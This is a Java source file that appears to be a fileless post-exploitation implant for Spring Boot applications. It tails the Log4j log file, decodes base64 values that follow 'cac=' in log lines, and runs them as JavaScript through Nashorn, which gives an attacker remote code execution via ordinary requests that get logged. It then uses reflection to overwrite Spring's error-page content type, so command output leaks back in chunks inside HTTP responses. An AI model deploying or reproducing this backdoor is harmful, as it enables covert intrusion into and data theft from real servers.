

import org.apache.commons.io.input.Tailer;
import org.apache.commons.io.input.TailerListener;
import org.apache.commons.io.input.TailerListenerAdapter;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.Appender;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.appender.FileAppender;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.Configurator;
import org.springframework.http.MediaType;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Base64;
import java.util.Date;
import java.util.Optional;

/**
 * @Classname ExecTemplateJDK8
 * @Author Welkin
 */
public class ExecTemplateJDK8ADRNoDisk {

    static {
        Logger logger = LogManager.getRootLogger();
        Configurator.setAllLevels(logger.getName(), Level.getLevel("DEBUG"));
        LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
        Configuration config = ctx.getConfiguration();
        Optional<Appender> appender = config.getAppenders().values().stream().filter(a -> a instanceof FileAppender).findFirst();

        if (appender.isPresent()) {
            String logFilePath = ((FileAppender)appender.get()).getFileName();
            logger.info("Log file location: {}", logFilePath);
            tailer(logFilePath);
        } else {
            logger.warn("File appender not found.");
        }
    }





    private static void tailer(String logFilePath) {
        TailerListener listener = new TailerListenerAdapter() {
            public void handle(String line) {
                Date date = new Date();
                DateFormat dateFormat = new SimpleDateFormat("HH:mm");
                String formattedDate = dateFormat.format(date);
                if(line.contains("cac=")&&line.contains(formattedDate)) {
                    String data = line.substring(line.lastIndexOf("cac=")+4,
                            line.lastIndexOf("\""));
                    String decoded = new String(Base64.getDecoder().decode(data));
                    System.out.println("Decoded data: " + decoded);
                    ScriptEngineManager engineManager = new ScriptEngineManager();
                    ScriptEngine engine = engineManager.getEngineByName("nashorn");
                    try {
                        Object object = engine.eval(decoded);
                        if(object != null) {
                            exfiltrateData(object.toString().getBytes());
                        }
                        System.out.println("Evaluated object: " + object);
                    } catch (Throwable  e) {
                        System.out.println(e.getMessage());
                    }

                }
            }
        };
        Tailer tailer = Tailer.create(new File(logFilePath), listener, 3000l);
        new Thread(tailer).start();
    }


    public static void exfiltrateData(byte[] data) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Class<?> staticViewClass = Class.forName("org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration$StaticView");
        Field textHtmlUtf8Field = staticViewClass.getDeclaredField("TEXT_HTML_UTF8");
        textHtmlUtf8Field.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(textHtmlUtf8Field, textHtmlUtf8Field.getModifiers() & ~Modifier.FINAL);
        MediaType newMediaType = new ModifiedMedaType("text", "html", StandardCharsets.UTF_8,data);
        textHtmlUtf8Field.set(null, newMediaType);
    }



    private static class ModifiedMedaType extends MediaType {
        private byte[] payload;
        public ModifiedMedaType(String text, String s, Charset utf8, byte[] payload) {
            super(text,s,utf8);
            this.payload = payload;
        }
        private int index = 0;
        private boolean finished = false;

        @Override
        public String toString() {
            if(!finished) {
                byte[] dataToSend;
                if(payload.length<50) {
                    dataToSend = payload;
                    index = payload.length;
                    finished = true;
                } else if( payload.length>index+50) {
                    dataToSend = Arrays.copyOfRange(payload, index, index + 50);
                    index += 50;
                    if(index == payload.length) {
                        finished = true;
                    }
                } else {
                    dataToSend = Arrays.copyOfRange(payload, index, payload.length);
                    finished = true;
                }
                String encodedData = Base64.getEncoder().encodeToString(dataToSend);
                encodedData = encodedData.replaceAll("=","/");
                return super.toString() + encodedData;
            }
            return super.toString();
        }

    }




}
